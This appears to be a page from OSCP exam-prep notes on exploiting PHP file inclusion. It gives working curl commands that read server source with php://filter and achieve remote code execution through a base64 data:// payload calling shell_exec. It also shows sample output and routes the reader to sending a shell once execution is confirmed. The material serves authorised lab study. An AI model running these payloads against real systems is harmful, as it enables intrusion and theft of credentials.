# Linux - RFI

**Step 7A of 50 · Linux**

*Use PHP stream wrappers to read source or execute a controlled payload when an include parameter accepts a remote or protocol-style path.*

## When to use this page

Use this page after [[Linux - LFI]] confirms that a PHP parameter includes a file. Remote file inclusion (RFI) means the application loads attacker-controlled content; PHP stream wrappers such as `php://filter` and `data://` can work even when an outbound HTTP request cannot.

## Read PHP source with `php://filter`

> **Why:** This request asks PHP to base64-encode the included source instead of executing it; decoding the response can reveal configuration paths and credentials without running the file.
```bash
curl -s "http://$BoxIP/index.php?file=php://filter/convert.base64-encode/resource=index.php" \
  | grep -oP '[A-Za-z0-9+/]{20,}={0,2}' | tail -1 | base64 -d
```

## Execute a `data://` payload

`data://` embeds the payload in the URL itself. Base64 keeps PHP syntax compact, but `+` must become `%2B` because a plus sign in a query string is decoded as a space.

> **Why:** This command creates a small PHP payload, URL-protects its base64 plus signs, and asks the vulnerable include to execute it; look for `uid=` output between the markers.
```bash
Payload=$(printf '%s' '<?php echo "###"; echo shell_exec("id 2>&1"); echo "###"; ?>' | base64 -w0 | sed 's/+/%2B/g')
curl -s "http://$BoxIP/index.php?file=data://text/plain;base64,$Payload" | tr '\n' ' ' | grep -oP '###\K[^#]+'
```

## Example output

```text
uid=48(apache) gid=48(apache) groups=48(apache)
```

## What did you get?

- [ ] PHP source is returned → **Read included configuration files and go to Step 17 · [[Linux - Credential Search]]**
- [ ] `uid=` appears between the markers → **RCE is confirmed; send a shell and go to Step 12 · [[Linux - Shell Stabilise]]**
- [ ] `data://` is ignored or empty → **Check `allow_url_include`, confirm the parameter really reaches `include()`, then treat this wrapper as a dead end**
- [ ] Neither wrapper works → **Return to Step 7 · [[Linux - LFI]] and try ordinary traversal or a different parameter**

## Notes

`php://filter` reads source; it does not execute it. `data://` executes only when PHP permits URL-style includes. Keep payload output marked so surrounding HTML does not hide the result.

## Gotcha

> [!warning] 💡
> SELinux may block Apache from opening outbound sockets. If `id` shows an `httpd_t` context and callbacks fail, continue through the web response channel rather than repeatedly changing listener ports.

## Additional routing

- [ ] A wrapper executes the harmless payload → **Send the approved shell payload and go to Step 12 · [[Linux - Shell Stabilise]]**
- [ ] Both wrappers are blocked → **Return to Step 7 · [[Linux - LFI]] and continue file-read enumeration**
## Seen in
- [[OSCP/BOXES/WRITE UPS/Linux/4. Snookums|Snookums]] -- confirmed in the box write-up

## Related stages

- [[Linux - Service Scan]]
- [[Linux - Web Enum]]
- [[Linux - Exploit Search]]

## External Resources

- https://book.hacktricks.wiki/en/generic-methodologies-and-resources/index.html
- https://www.revshells.com/
## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
